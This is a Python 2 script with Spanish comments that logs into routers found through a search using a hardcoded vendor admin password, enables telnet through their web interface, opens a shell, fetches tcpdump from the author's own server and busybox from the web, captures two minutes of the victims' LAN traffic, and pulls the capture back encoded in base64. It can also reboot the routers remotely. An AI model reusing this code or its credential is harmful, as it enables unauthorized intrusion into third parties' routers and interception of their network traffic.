import mechanize
import telnetlib
import re
import os
import time

from colores import color

def hastaAndar(b, direccion, ip):
    # el router suele tener un error y dice 400 bad request, asi que se reintenta
    try:
        r = b.open("http://" + ip + "/" + direccion)
        r = r.read()
    except:
        r = "400 Bad Request"
        
    if "Authentication fail" in r:
        raise Exception("Le cambiaron la contrasenna al router?!")
        
    while "400 Bad Request" in r:
        print color.amarillo + "mala respuesta" + color.fin
        try:
            r = b.open("http://" + ip + "/" + direccion)
            r = r.read()
        except:
            r = "400 Bad Request"
        if "Authentication fail" in r:
            raise Exception("Le cambiaron la contrasenna al router?!")
    return r
        
        
def generarpcap(ip):
    ip = ip[7:] # el buscador te devuelve la ip con el http://
    print color.amarillo + "generando pcap para %s" % ip + color.fin
    buscaips = re.compile("\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}")

    #ip = "201.253.157.47"
    miip = "201.253.208.71"


    b = mechanize.Browser()
    b.set_handle_robots(False)
    b.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)')]


    hastaAndar(b,"login.html", ip)
    hastaAndar(b,"login.cgi?username=admin&psd=CalVxePV1!", ip)
    hastaAndar(b,"scsrvcntr.cmd?servicelist=HTTP=1,1,80;TELNET=1,1,23;FTP=0,0,21;TFTP=1,0,69;ICMP=1,0,0;SNMP=1,0,161;SAMBA=1,0,445;", ip)
    hastaAndar(b,"logout.cgi", ip)
            
    # ahora ya tiene habilitado telnet, y como marca tiene deshabilitado el ftp local


    user = "admin"
    password = "CalVxePV1!"
    temp = ""

    try:
        tn = telnetlib.Telnet(ip)
    except telnetlib.socket.error:
        raise Exception("Probablemente ahi no hay servidor Telnet")

    try:
        temp = tn.read_until("Login: ")
    except EOFError:
        resetear(ip)
        raise Exception("El telnet mando EOF sin 'Login: ' mando '%s'" % temp)
        
    tn.write(user + "\n")
    tn.read_until("Password: ")
    tn.write(password + "\n")

    #vamos a sh
    tn.write("sh\n")
    try:
        temp = tn.read_until("#")
    except EOFError:
        raise Exception("Algo paso cuando mando 'sh', llego '%s'" % temp)
    #vamos a donde podemos escribir
    tn.write("cd /tmp/\n")
    tn.read_until("#")
    #reviso si tiene tcpdump
    tn.write("ls\n")
    if "tcpdump" not in tn.read_until("#"):
        tn.write("wget http://%s/tcpdump\n" % miip)
        tn.read_until("#")
    tn.write("chmod +x tcpdump\n")
    tn.read_until("#")
    #reviso si tiene busybox
    tn.write("ls\n")
    if "busybox" not in tn.read_until("#"):
        tn.write("wget http://www.busybox.net/downloads/binaries/latest/busybox-mips\n")
        tn.read_until("#")

    tn.write("chmod +x busybox-mips\n")
    tn.read_until("#")

    #genero pcap
    # saco -n para que si convierta los ip en nombres
    # saco -s 0 para que no haya "snaplen" y tome todo el paquete
    tn.write("./tcpdump -i br0 -w textfile.pcap\n")
    time.sleep(120)
    tn.write("\x03")
    salidadump = tn.read_until("#")
    if "cannot execute" in salidadump:
        print color.rojo + "No se puedo ejecutar tcpdump" + color.fin
        raise ValueError
    print color.amarillo + salidadump + color.fin
    #lo comprimo con gzip
    tn.write("./busybox-mips gzip -9 textfile.pcap\n")
    tn.read_until("#")
    #lo convierto a base64
    tn.write("./busybox-mips base64 textfile.pcap.gz\n")
    datos = tn.read_until("#")
    tn.write("\x03")
    tn.write("\x04")
    tn.write("\x04")

    # print datos

    datos = datos.split("\r\n")
    datos = datos[1:-1]
    nada = ""
    datos = nada.join(datos)

    datos = datos.decode("base64")

    f = open("pcaps/%s.pcap.gz" % ip,"w")

    f.write(datos)

    f.close()

def resetear(ip):
    b = mechanize.Browser()
    b.set_handle_robots(False)
    b.addheaders = [('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.0; Windows 98;)')]
    hastaAndar(b,"login.html", ip)
    hastaAndar(b,"login.cgi?username=admin&psd=CalVxePV1!", ip)
    r = hastaAndar(b,"resetrouter.html", ip)
    inicio = r.find("sessionKey") + len("sessionKey='")
    r = r[inicio:inicio + 20]
    r = r.split("'")
    key = r[0]
    r = hastaAndar(b,"rebootinfo.cgi?sessionKey=%s" % key, ip)
    if "is rebooting" in r:
        print "Se esta reiniciando %s" % ip
    else:
        raise Exception("No se pudo reiniciar el router")

